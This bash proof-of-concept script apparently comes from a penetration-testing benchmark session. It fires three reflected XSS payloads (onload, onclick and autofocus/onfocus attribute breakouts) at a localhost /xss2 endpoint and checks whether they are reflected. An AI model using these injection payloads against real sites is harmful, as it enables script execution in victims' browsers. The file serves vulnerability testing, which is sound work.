#!/bin/bash
# POC: Demonstrates reflected XSS via event handler injection in iframe attribute breakout. Injects onload event handler to execute arbitrary JavaScript.
# Target: ./repo
# Created: 2025-11-05T17:26:39.265Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# XSS Event Handler Injection POC - /xss2 endpoint
# Tests attribute breakout with onload event handler

TARGET="${1:-http://localhost:3000}"
ENDPOINT="/xss2"

echo "[*] Testing XSS via Event Handler Injection on ${TARGET}${ENDPOINT}"
echo ""

# Test 1: Basic onload event handler injection
echo "[Test 1] Onload event handler injection"
PAYLOAD="\" onload=\"alert(1)"
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?url=${ENCODED_PAYLOAD}")

echo "Payload: ${PAYLOAD}"
echo "Encoded: ${ENCODED_PAYLOAD}"
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if the payload is reflected in the response
if echo "$RESPONSE" | grep -q 'onload="alert(1)'; then
    echo "[+] SUCCESS: Event handler injection confirmed!"
    echo "[+] The onload event handler was reflected into the iframe"
    echo ""
else
    echo "[-] Event handler not found in direct form, checking for HTML entity encoding..."
    if echo "$RESPONSE" | grep -q 'onload'; then
        echo "[+] Partial match: 'onload' found in response"
        echo "$RESPONSE"
    fi
fi

echo ""
echo "[Test 2] Testing onclick event handler"
PAYLOAD2="\" onclick=\"alert(2)"
ENCODED_PAYLOAD2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD2'''))")
RESPONSE2=$(curl -s "${TARGET}${ENDPOINT}?url=${ENCODED_PAYLOAD2}")

echo "Payload: ${PAYLOAD2}"
echo "Response:"
echo "$RESPONSE2"
echo ""

if echo "$RESPONSE2" | grep -q 'onclick'; then
    echo "[+] SUCCESS: onclick event handler injection confirmed!"
fi

echo ""
echo "[Test 3] Testing autofocus + onfocus event handler"
PAYLOAD3="\" autofocus onfocus=\"alert(3)"
ENCODED_PAYLOAD3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD3'''))")
RESPONSE3=$(curl -s "${TARGET}${ENDPOINT}?url=${ENCODED_PAYLOAD3}")

echo "Payload: ${PAYLOAD3}"
echo "Response:"
echo "$RESPONSE3"
echo ""

if echo "$RESPONSE3" | grep -q 'onfocus'; then
    echo "[+] SUCCESS: onfocus event handler injection confirmed!"
fi

echo ""
echo "[Summary]"
echo "If any of the above tests show event handler attributes in the iframe,"
echo "the application is vulnerable to XSS via attribute breakout."